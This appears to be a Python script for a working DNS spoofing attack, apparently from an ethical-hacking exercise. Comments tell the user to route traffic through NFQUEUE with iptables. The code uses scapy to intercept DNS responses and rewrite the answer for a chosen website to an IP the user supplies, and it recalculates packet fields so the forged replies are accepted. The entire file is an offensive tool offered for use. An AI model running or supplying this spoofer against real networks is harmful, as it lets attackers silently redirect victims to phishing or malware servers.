#!/usr/bin/env python

# pip install netfilterqueue
# iptables -I FORWARD -j NFQUEUE --queue-num (any number you want to start with your queue) 
# iptables -I OUTPUT -j NFQUEUE --queue-num (any number you want to start with your queue) 
# iptables -I INPUT -j NFQUEUE --queue-num (any number you want to start with your queue) 

import scapy.all as scapy 
import netfilterqueue
import pyfiglet
import subprocess
import optparse

def get_banner():
    banner = pyfiglet.figlet_format('Dns Spoofer', font='slant')
    print(banner)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-w", "--website", dest="website", 
                      help="Target website to spoof (e.g., www.vulnweb.com)")
    parser.add_option("-t", "--target-ip", dest="ipaddress",
                      help="IP address to redirect to")
    (options, arguments) = parser.parse_args()
    
    if not options.website:
        parser.error("[-] Please specify the target website, use --help for more info")
    elif not options.ipaddress:
        parser.error("[-] Please specify the IP address to redirect to, use --help for more info")
    return options

def process_packet(packet, target_website, target_ip):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        if target_website in qname:
            print(f"[+] Spoofing {target_website} to {target_ip}")
            answer = scapy.DNSRR(rrname=qname, rdata=target_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            # Delete checksums and lengths
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            
            packet.set_payload(bytes(scapy_packet))
    packet.accept()

def main():
    get_banner()
    options = get_arguments()
    
    try:
        print(f"[*] Target Website: {options.website}")
        print(f"[*] Redirect IP: {options.ipaddress}")
        print("[*] Starting DNS Spoofing...")
        
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, lambda pkt: process_packet(pkt, options.website, options.ipaddress))
        queue.run()
        
    except KeyboardInterrupt:
        print("\n[*] Detected CTRL + C ... Quitting ...")

if __name__ == "__main__":
    main()